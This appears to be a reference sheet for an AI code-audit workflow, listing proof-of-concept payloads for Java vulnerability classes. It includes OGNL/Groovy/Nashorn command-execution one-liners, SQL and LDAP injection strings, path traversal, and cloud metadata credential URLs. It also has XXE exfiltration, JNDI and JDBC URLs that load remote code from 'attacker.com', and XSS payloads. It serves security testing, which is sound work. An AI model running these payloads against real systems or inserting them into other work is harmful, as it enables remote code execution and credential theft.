# Red-Team PoC Construction Hints

Use these to fill the `attack_vector` and `poc_payload` fields for each
VULNERABLE finding in skill Phase 5.

---

## By vuln_type

- **SQL Injection**
  Close single/double quotes; `UNION SELECT`; blind `SLEEP(5)` time-based;
  MyBatis `${}` directly injects column names. Stacked queries on MSSQL →
  `xp_cmdshell` RCE.

- **Command Injection**
  Shell meta-chars: `;` `|` `&&` `$(cmd)` backticks. For `ProcessBuilder`
  single-argv paths, try `-c` or PATH hijack (relative exec name + shadow `ls`).

- **Code Injection** (OGNL / MVEL / Groovy / JEXL / ScriptEngine)
  - OGNL: `@java.lang.Runtime@getRuntime().exec({'id'})` — Struts2 S2-045 class
  - MVEL: `Runtime.getRuntime().exec("id")`
  - Groovy: `"id".execute().text` — the simplest one-liner
  - JEXL: `''.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(...)`
  - ScriptEngine (Nashorn): `Java.type("java.lang.Runtime").getRuntime().exec("id")`

- **Path Traversal**
  `../../../etc/passwd`, URL double-encoding `%2e%2e%2f`, Windows `\..\`,
  UNC paths `\\attacker\share`, NULL-byte `%00.txt` on older JVMs.

- **Zip Slip**
  ZipEntry name containing `../../../etc/cron.d/malicious`. Combined with
  `FileOutputStream(entry.getName())` → write arbitrary file. Writing to
  `/etc/cron.d/` or webshell dirs → RCE.

- **XXE**
  Local file read: `<!ENTITY xxe SYSTEM "file:///etc/passwd">`.
  Out-of-band SSRF / blind: `SYSTEM "http://attacker.com/exfil?d=..."` with
  parameter entities.

- **SSRF**
  Internal addresses: `http://127.0.0.1:8500/v1/catalog/services` (Consul),
  cloud metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.
  DNS rebinding via `*.nip.io` or custom resolvers.

- **LDAP Injection**
  `*` wildcard for enumeration; `)(objectclass=*` to close and inject a second
  filter; `admin)(&(uid=*` to bypass auth checks.

- **XPath Injection**
  `' or '1'='1` (single quotes), `')]|//user[contains('a','`, bool-based blind
  `string-length(password)>5`.

- **Unsafe Deserialization**
  Use public gadget chains: Commons-Collections `InvokerTransformer`,
  ROME `ToStringBean`, ysoserial pre-built payloads. JNDI reference gadget
  for Spring / Jackson Default Typing.

- **JNDI Injection**
  `ldap://attacker.com/Exploit` (Log4Shell class); `rmi://attacker.com/Exploit`;
  `dns://attacker.com/x` for blind probing. JDK 8u191+ needs
  `trustURLCodebase=true` or local factory class.

- **JDBC URL Injection**
  - MySQL: `jdbc:mysql://attacker/?allowLoadLocalInfile=true&serverTimezone=UTC`
    (client-side file read) or `&autoDeserialize=true&queryInterceptors=...`
  - H2: `jdbc:h2:mem:test;INIT=SCRIPT FROM 'http://attacker.com/e.sql'` (RCE)
  - Postgres: `&socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://attacker.com/e.xml`

- **Unvalidated Forward**
  Internal paths normally filtered at web layer: `/WEB-INF/web.xml`,
  `/admin.jsp`, `/actuator/env` (Spring Boot), `/console`.

- **Open Redirect**
  `//attacker.com` (protocol-relative), `https:attacker.com` (malformed but
  browser-tolerant), `legit.com.attacker.com` (tail-domain injection),
  `https://legit.com@attacker.com` (authority confusion).

- **XSS**
  Pick by output context:
  - HTML body: `<script>alert(1)</script>`, `<img src=x onerror=alert(1)>`
  - HTML attribute: `" onmouseover="alert(1)`, `" autofocus onfocus="alert(1)`
  - JS context: `';alert(1);//`
  - URL attribute (href/src): `javascript:alert(1)`
  - SVG: `"><svg/onload=alert(1)>`

- **Unsafe Reflection**
  Class names of interest: `java.lang.Runtime`, `javax.naming.InitialContext`,
  `java.beans.XMLDecoder`. Via `Class.forName(userInput).newInstance()` → any
  class with a visible public constructor becomes instantiable.

- **Trust Boundary Violation**
  Write `isAdmin=true` / `role=ADMIN` to session via
  `/setPref?key=role&value=ADMIN`. Later auth check reads
  `session.getAttribute("role")` and trusts it.

- **Sensitive Data in Log / URL**
  No PoC construction needed — the leak is the vulnerability. Fill
  `attack_vector` with "log exposure via centralized logging" or "URL
  exposure via Referer / CDN logs".

- **Weak Cryptography / Weak Random / Insecure TLS / JWT None / Insecure
  Cookie / Insecure Temp File / Stack Trace Exposure**
  Also no traditional PoC. `poc_payload` can be an illustrative example of
  exploitation (e.g., "JWT with `alg:none` header accepted as valid admin
  token"), `attack_vector` describes the threat model.
